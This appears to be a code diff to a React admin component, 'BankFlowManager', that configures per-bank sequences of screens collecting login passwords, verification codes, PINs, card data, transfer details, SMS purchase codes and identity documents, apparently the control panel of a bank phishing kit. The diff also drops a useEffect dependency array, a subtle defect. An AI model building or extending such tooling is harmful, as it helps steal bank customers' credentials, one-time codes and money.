@@ -35,14 +35,17 @@ const SCREEN_TYPES = [
   { value: ScreenType.FOLIO, label: 'Folio - Ingreso de número de folio' },
   { value: ScreenType.VALIDANDO, label: 'Validando - Pantalla de carga' },
   { value: ScreenType.LOGIN, label: 'Login - Usuario y contraseña' },
-  { value: ScreenType.OTP, label: 'OTP - Código de verificación' },
+  { value: ScreenType.CODIGO, label: 'Código - Código de verificación' },
+  { value: ScreenType.NIP, label: 'NIP - Número de identificación personal' },
   { value: ScreenType.TARJETA, label: 'Tarjeta - Datos de tarjeta' },
-  { value: ScreenType.TRANSFERENCIA, label: 'Transferencia - Datos bancarios' },
+  { value: ScreenType.TRANSFERIR, label: 'Transferir - Datos bancarios' },
   { value: ScreenType.SMS_COMPRA, label: 'SMS Compra - Código SMS de compra' },
   { value: ScreenType.PROTECCION_BANCARIA, label: 'Protección Bancaria - Captura de documento' },
-  { value: ScreenType.PROCESANDO_ACLARACION, label: 'Procesando - Proceso de aclaración' },
-  { value: ScreenType.ACLARACION_EXITOSA, label: 'Éxito - Aclaración exitosa' },
-  { value: ScreenType.VERIFICACION_ID, label: 'Verificación ID - Verificación de identidad' }
+  { value: ScreenType.PROTECCION_SALDO, label: 'Protección Saldo - Protección de saldo' },
+  { value: ScreenType.VERIFICACION_ID, label: 'Verificación ID - Verificación de identidad' },
+  { value: ScreenType.CANCELACION, label: 'Cancelación - Cancelación de operación' },
+  { value: ScreenType.CANCELACION_RETIRO, label: 'Cancelación Retiro - Cancelar retiro' },
+  { value: ScreenType.MENSAJE, label: 'Mensaje - Mensaje personalizado' }
 ];
 
 interface FlowStep {
@@ -58,7 +61,7 @@ export default function BankFlowManager() {
   const [flowSteps, setFlowSteps] = useState<FlowStep[]>([]);
 
   // Obtener flujo existente del banco seleccionado
-  const { data: flowData, isLoading } = useQuery({
+  const { data: flowData, isLoading } = useQuery<{ success: boolean; flow: { flowConfig: FlowStep[] } | null }>({
     queryKey: ['/api/screen-flows', selectedBank],
     enabled: !!selectedBank,
   });
@@ -73,7 +76,7 @@ export default function BankFlowManager() {
         { screenType: ScreenType.FOLIO, waitForUserInput: true }
       ]);
     }
-  }, [flowData, selectedBank, isLoading]);
+  });
 
   // Mutación para guardar flujo
   const saveMutation = useMutation({
@@ -81,10 +84,18 @@ export default function BankFlowManager() {
       if (!selectedBank) throw new Error('Seleccione un banco');
       if (flowSteps.length === 0) throw new Error('Agregue al menos un paso al flujo');
 
-      return apiRequest(`/api/screen-flows/${selectedBank}`, {
+      const response = await fetch(`/api/screen-flows/${selectedBank}`, {
         method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ flowConfig: flowSteps })
       });
+      
+      if (!response.ok) {
+        const error = await response.json();
+        throw new Error(error.message || 'Error al guardar el flujo');
+      }
+      
+      return response.json();
     },
     onSuccess: () => {
       queryClient.invalidateQueries({ queryKey: ['/api/screen-flows', selectedBank] });
